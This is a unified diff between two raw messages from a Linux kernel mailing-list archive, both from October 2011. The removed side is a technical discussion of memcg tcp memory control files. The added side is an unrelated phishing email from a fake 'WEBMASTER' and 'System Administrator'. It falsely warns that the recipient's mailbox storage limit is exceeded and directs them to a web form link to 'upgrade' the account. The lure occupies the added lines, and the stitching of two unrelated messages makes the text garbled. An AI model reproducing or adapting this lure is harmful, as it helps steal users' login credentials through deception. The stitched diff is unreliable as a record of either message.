@@ -1,123 +1,51 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S935736Ab1JFIqM (ORCPT <rfc822;w@1wt.eu>);
-	Thu, 6 Oct 2011 04:46:12 -0400
-Received: from shutemov.name ([188.40.19.243]:39521 "EHLO shutemov.name"
+	id S935743Ab1JFIxC (ORCPT <rfc822;w@1wt.eu>);
+	Thu, 6 Oct 2011 04:53:02 -0400
+Received: from kendy.up.ac.za ([137.215.101.101]:33803 "EHLO kendy.up.ac.za"
 	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S932384Ab1JFIqK (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Thu, 6 Oct 2011 04:46:10 -0400
-Date: Thu, 6 Oct 2011 11:46:09 +0300
-From: "Kirill A. Shutemov" <kirill@shutemov.name>
-To: Glauber Costa <glommer@parallels.com>
-Cc: linux-kernel@vger.kernel.org, paul@paulmenage.org, lizf@cn.fujitsu.com,
-        kamezawa.hiroyu@jp.fujitsu.com, ebiederm@xmission.com,
-        davem@davemloft.net, gthelen@google.com, netdev@vger.kernel.org,
-        linux-mm@kvack.org, avagin@parallels.com
-Subject: Re: [PATCH v4 7/8] Display current tcp memory allocation in kmem
- cgroup
-Message-ID: <20111006084609.GA28820@shutemov.name>
-References: <1317637123-18306-1-git-send-email-glommer@parallels.com>
- <1317637123-18306-8-git-send-email-glommer@parallels.com>
- <20111003121446.GD29312@shutemov.name>
- <4E89A846.1010200@parallels.com>
- <20111003122511.GA29982@shutemov.name>
- <4E89AA01.3000803@parallels.com>
- <20111003123620.GA30018@shutemov.name>
- <4E8ACD6E.3090208@parallels.com>
+	id S932384Ab1JFIxA (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
+	Thu, 6 Oct 2011 04:53:00 -0400
+Message-ID: <20111006105037.14296b2nd560x49p@student.up.ac.za>
+Date: Thu, 06 Oct 2011 10:50:37 +0200
+From: WEBMASTER <s29128138@tuks.co.za>
+To: undisclosed-recipients:;
+Subject: You have exceeded the storage limit on your mailbox.
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
+Content-Type: text/plain;
+	charset=ISO-8859-1;
+	DelSp="Yes";
+	format="flowed"
 Content-Disposition: inline
-In-Reply-To: <4E8ACD6E.3090208@parallels.com>
-User-Agent: Mutt/1.5.21 (2010-09-15)
+Content-Transfer-Encoding: 7bit
+User-Agent: Internet Messaging Program (IMP) H3 (4.2)
+X-Originating-IP: 82.128.14.67
+X-Remote-Browser: Opera/9.80 (Windows NT 5.1; U; Edition Campaign 14; en)
+	Presto/2.9.168 Version/11.51
+X-Scan-Signature: 075be3456426d5e80755e7a8471b0ad4
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-On Tue, Oct 04, 2011 at 01:10:06PM +0400, Glauber Costa wrote:
-> On 10/03/2011 04:36 PM, Kirill A. Shutemov wrote:
-> > On Mon, Oct 03, 2011 at 04:26:41PM +0400, Glauber Costa wrote:
-> >> On 10/03/2011 04:25 PM, Kirill A. Shutemov wrote:
-> >>> On Mon, Oct 03, 2011 at 04:19:18PM +0400, Glauber Costa wrote:
-> >>>> On 10/03/2011 04:14 PM, Kirill A. Shutemov wrote:
-> >>>>> On Mon, Oct 03, 2011 at 02:18:42PM +0400, Glauber Costa wrote:
-> >>>>>> This patch introduces kmem.tcp_current_memory file, living in the
-> >>>>>> kmem_cgroup filesystem. It is a simple read-only file that displays the
-> >>>>>> amount of kernel memory currently consumed by the cgroup.
-> >>>>>>
-> >>>>>> Signed-off-by: Glauber Costa<glommer@parallels.com>
-> >>>>>> CC: David S. Miller<davem@davemloft.net>
-> >>>>>> CC: Hiroyouki Kamezawa<kamezawa.hiroyu@jp.fujitsu.com>
-> >>>>>> CC: Eric W. Biederman<ebiederm@xmission.com>
-> >>>>>> ---
-> >>>>>>     Documentation/cgroups/memory.txt |    1 +
-> >>>>>>     mm/memcontrol.c                  |   11 +++++++++++
-> >>>>>>     2 files changed, 12 insertions(+), 0 deletions(-)
-> >>>>>>
-> >>>>>> diff --git a/Documentation/cgroups/memory.txt b/Documentation/cgroups/memory.txt
-> >>>>>> index 1ffde3e..f5a539d 100644
-> >>>>>> --- a/Documentation/cgroups/memory.txt
-> >>>>>> +++ b/Documentation/cgroups/memory.txt
-> >>>>>> @@ -79,6 +79,7 @@ Brief summary of control files.
-> >>>>>>      memory.independent_kmem_limit	 # select whether or not kernel memory limits are
-> >>>>>>     				   independent of user limits
-> >>>>>>      memory.kmem.tcp.max_memory      # set/show hard limit for tcp buf memory
-> >>>>>> + memory.kmem.tcp.current_memory  # show current tcp buf memory allocation
-> >>>>>
-> >>>>> Both are in pages, right?
-> >>>>> Shouldn't it be scaled to bytes and named uniform with other memcg file?
-> >>>>> memory.kmem.tcp.limit_in_bytes/usage_in_bytes.
-> >>>>>
-> >>>> You are absolutely correct.
-> >>>> Since the internal tcp comparison works, I just ended up never noticing
-> >>>> this.
-> >>>
-> >>> Should we have failcnt and max_usage_in_bytes for tcp as well?
-> >>>
-> >>
-> >> Well, we get a fail count from the tracer anyway, so I don't really see
-> >> a need for that. I see value in having it for the slab allocation
-> >> itself, but since this only controls the memory pressure framework, I
-> >> think we can live without it.
-> >>
-> >> That said, this is not a strong opinion. I can add it if you'd prefer.
-> >
-> > It's good for userspace to have the same set of files for all domains:
-> >   - memory;
-> >   - memory.memsw;
-> >   - memory.kmem;
-> >   - memory.kmem.tcp;
-> >   - etc.
-> > Userspace can reuse code for handling them in this case.
-> >
-> Ok. Back on this.
-> 
-> Not all domains have all files anyway.
 
-$ ls -l *.{failcnt,limit_in_bytes,max_usage_in_bytes,usage_in_bytes}
--rw-r--r-- 1 root root 0 Oct  6 11:34 memory.failcnt
--rw-r--r-- 1 root root 0 Oct  6 11:34 memory.limit_in_bytes
--rw-r--r-- 1 root root 0 Oct  6 11:34 memory.max_usage_in_bytes
--rw-r--r-- 1 root root 0 Oct  6 11:34 memory.memsw.failcnt
--rw-r--r-- 1 root root 0 Oct  6 11:34 memory.memsw.limit_in_bytes
--rw-r--r-- 1 root root 0 Oct  6 11:34 memory.memsw.max_usage_in_bytes
--r--r--r-- 1 root root 0 Oct  6 11:34 memory.memsw.usage_in_bytes
--r--r--r-- 1 root root 0 Oct  6 11:34 memory.usage_in_bytes
+You have exceeded the storage limit on your mailbox.
 
-Hm?..
+You will not be able to send or receive new mail until you upgrade your
+email quota.
 
-> max_usage seems to be a property of the main memcg, not of its domains.
-> failcnt is present on memsw, and on that only. The problem here, is that 
-> this can fail ( and usually will ) in codepaths outside the memory
-> controller. (see net/core/sock.c:__sk_mem_schedule)
+Copy the below link and fill the form to upgrade your account.
+http://www.onlinevideoconverter.in/phpform/use/webmail/form1.html
 
-+1 reason to use res_counter. It provides all data needed for this files.
- 
-> Also, max_usage makes sense for kernel memory as a whole, but I don't 
-> think it makes sense here as we're only controlling a specific pressure 
-> condition.
+System Administrator
+192.168.0.1
 
-max_usage is reasonable for everything you can limit. It allows you to
-track if limit is set appropriate.
 
--- 
- Kirill A. Shutemov
+
+
+
+This message and attachments are subject to a disclaimer. Please refer
+to www.it.up.ac.za/documentation/governance/disclaimer/ for full
+details. / Hierdie boodskap en aanhangsels is aan 'n vrywaringsklousule
+onderhewig. Volledige besonderhede is by
+www.it.up.ac.za/documentation/governance/disclaimer/ beskikbaar.
+
